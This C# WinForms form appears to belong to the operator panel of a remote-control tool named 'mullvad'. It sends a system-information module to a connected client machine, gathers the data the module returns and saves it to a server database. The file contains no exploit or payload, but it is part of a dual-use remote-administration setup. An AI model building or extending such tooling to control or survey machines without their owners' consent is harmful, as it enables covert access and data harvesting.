using System.Text.Json;
using mullvad.Database;
using mullvad.Modules;
using mullvad.Network;
using mullvad.Theme;

namespace mullvad.Forms;

public sealed class SystemInfoForm : Form
{
    private const string ModuleFile = "mullvad.Module.SystemInformation";
    private const string ModuleId   = "mullvad.sysinfo";

    private readonly ClientHandler _handler;
    private ModuleContext?         _ctx;

    // ── Controls ──────────────────────────────────────────────────────────────
    private ToolStrip            toolbar       = null!;
    private ToolStripButton      btnRefresh    = null!;
    private ToolStripButton      btnSaveDb     = null!;
    private ListView             listView      = null!;
    private StatusStrip          statusStrip   = null!;
    private ToolStripStatusLabel statusLabel   = null!;
    private ToolStripProgressBar statusProgress = null!;
    private Panel                loadingPanel  = null!;
    private Label                loadingLabel  = null!;

    // Collected data
    private List<(string category, string item, string value)> _data = new();

    public SystemInfoForm(ClientHandler handler)
    {
        _handler = handler;
        Build();
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Construction
    // ─────────────────────────────────────────────────────────────────────────
    private void Build()
    {
        SuspendLayout();

        Text          = $"System Information  —  {_handler.Info.Computer}";
        ClientSize    = new Size(680, 500);
        Font          = new Font("Segoe UI", 9F);
        MinimumSize   = new Size(480, 360);
        StartPosition = FormStartPosition.CenterParent;
        ShowInTaskbar = true;

        // ── Toolbar ──────────────────────────────────────────────────────────
        toolbar = new ToolStrip { GripStyle = ToolStripGripStyle.Hidden, Dock = DockStyle.Top };

        btnRefresh = MakeBtn("⟳", "Refresh", "refresh.png");
        btnRefresh.Click += (_, _) => _ = CollectAsync();

        btnSaveDb = MakeBtn("💾", "Save to Database", "information.png");
        btnSaveDb.Click += (_, _) => SaveToDb();

        toolbar.Items.AddRange(new ToolStripItem[] { btnRefresh, new ToolStripSeparator(), btnSaveDb });

        // ── ListView ─────────────────────────────────────────────────────────
        listView = new ListView
        {
            Dock          = DockStyle.Fill,
            View          = View.Details,
            FullRowSelect = true,
            GridLines     = true,
            Font          = new Font("Segoe UI", 9F),
        };
        listView.Columns.Add("Category", 120);
        listView.Columns.Add("Item",     200);
        listView.Columns.Add("Value",    300);

        // ── Status strip ─────────────────────────────────────────────────────
        statusStrip    = new StatusStrip();
        statusLabel    = new ToolStripStatusLabel { Spring = true, TextAlign = ContentAlignment.MiddleLeft };
        statusProgress = new ToolStripProgressBar { Visible = false, Width = 120 };
        statusStrip.Items.AddRange(new ToolStripItem[] { statusLabel, statusProgress });

        // ── Loading overlay ───────────────────────────────────────────────────
        loadingPanel = new Panel
        {
            Dock = DockStyle.Fill, BackColor = Color.FromArgb(200, SystemColors.Control),
            Visible = true,
        };
        loadingLabel = new Label
        {
            Text      = "Delivering module to client…",
            AutoSize  = false,
            TextAlign = ContentAlignment.MiddleCenter,
            Dock      = DockStyle.Fill,
            Font      = new Font("Segoe UI", 10F),
        };
        loadingPanel.Controls.Add(loadingLabel);

        Controls.Add(loadingPanel);
        Controls.Add(listView);
        Controls.Add(toolbar);
        Controls.Add(statusStrip);

        loadingPanel.BringToFront();

        ResumeLayout(false);
        PerformLayout();

        Load       += OnLoad;
        FormClosed += OnFormClosed;
    }

    private static ToolStripButton MakeBtn(string text, string tip, string? iconFile = null)
    {
        var btn = new ToolStripButton
        {
            ToolTipText  = tip,
            DisplayStyle = ToolStripItemDisplayStyle.Image,
            ImageScaling = ToolStripItemImageScaling.SizeToFit,
        };
        if (iconFile != null)
        {
            var img = IconLoader.Load(iconFile);
            if (img is not null) { btn.Image = img; return btn; }
        }
        btn.Text         = text;
        btn.DisplayStyle = ToolStripItemDisplayStyle.Text;
        return btn;
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Load — deliver module then collect
    // ─────────────────────────────────────────────────────────────────────────
    private async void OnLoad(object? sender, EventArgs e)
    {
        SetToolbarEnabled(false);
        _handler.Disconnected += OnClientDisconnected;

        var progress = new Progress<string>(msg =>
        {
            loadingLabel.Text = msg;
            statusLabel.Text  = msg;
        });

        var bytes = ModuleLoader.GetModuleBytes(ModuleFile);
        if (bytes == null)
        {
            loadingLabel.Text = "Module file not found.\nBuild the SystemInformation project first.";
            statusLabel.Text  = "Module not found.";
            return;
        }

        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(45));
        bool ok = await ModuleDelivery.EnsureDeliveredAsync(_handler, ModuleFile, bytes, progress, cts.Token);

        if (!ok)
        {
            loadingLabel.Text = "Failed to load module on client.";
            statusLabel.Text  = "Module delivery failed.";
            return;
        }

        _ctx = new ModuleContext(_handler, ModuleId);
        _ctx.Disconnected += (_, _) => BeginInvoke(() => OnClientDisconnected(_handler));

        loadingPanel.Visible = false;
        SetToolbarEnabled(true);

        await CollectAsync();
    }

    private void OnFormClosed(object? sender, FormClosedEventArgs e)
    {
        _handler.Disconnected -= OnClientDisconnected;
        _ctx?.Dispose();
    }

    private void OnClientDisconnected(ClientHandler _)
    {
        if (IsDisposed) return;
        BeginInvoke(() =>
        {
            SetToolbarEnabled(false);
            statusLabel.Text  = "Disconnected.";
            loadingLabel.Text = "Client disconnected.";
            loadingPanel.Visible = true;
        });
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Collect
    // ─────────────────────────────────────────────────────────────────────────
    private async Task CollectAsync()
    {
        if (_ctx == null) return;
        SetBusy(true);
        statusLabel.Text = "Collecting system information…";
        try
        {
            var json = await _ctx.ExecuteAsync("collect", "");
            ParseAndDisplay(json);
        }
        catch (OperationCanceledException) { statusLabel.Text = "Timed out."; }
        catch (Exception ex)               { statusLabel.Text = $"Error: {ex.Message}"; }
        finally { SetBusy(false); }
    }

    private void ParseAndDisplay(string json)
    {
        _data.Clear();
        listView.BeginUpdate();
        listView.Items.Clear();
        try
        {
            var doc = JsonDocument.Parse(json).RootElement;
            if (doc.ValueKind == JsonValueKind.Array)
            {
                foreach (var el in doc.EnumerateArray())
                {
                    var cat   = Str(el, "category");
                    var item  = Str(el, "item");
                    var value = Str(el, "value");

                    _data.Add((cat, item, value));

                    var lvi = new ListViewItem(cat);
                    lvi.SubItems.Add(item);
                    lvi.SubItems.Add(value);
                    listView.Items.Add(lvi);
                }
            }
            statusLabel.Text = $"Collected {_data.Count} items at {DateTime.Now:HH:mm:ss}";
        }
        catch (Exception ex)
        {
            statusLabel.Text = $"Parse error: {ex.Message}";
        }
        finally { listView.EndUpdate(); }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Save to DB
    // ─────────────────────────────────────────────────────────────────────────
    private void SaveToDb()
    {
        if (_data.Count == 0) { statusLabel.Text = "Nothing to save."; return; }

        // Flatten to (item, value) — prepend category to item for uniqueness
        var rows = _data.Select(d => ($"{d.category} / {d.item}", d.value)).ToList();
        ServerDatabase.SaveSystemInfo(_handler.Info.Id, rows);
        ServerDatabase.UpsertClient(_handler.Info);
        statusLabel.Text = $"Saved {rows.Count} rows to database.";
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Helpers
    // ─────────────────────────────────────────────────────────────────────────
    private void SetToolbarEnabled(bool on)
    {
        foreach (ToolStripItem i in toolbar.Items) i.Enabled = on;
    }

    private void SetBusy(bool busy)
    {
        statusProgress.Visible = busy;
        if (busy) statusProgress.Style = ProgressBarStyle.Marquee;
    }

    private static string Str(JsonElement el, string key)
        => el.TryGetProperty(key, out var v) ? v.GetString() ?? "" : "";
}

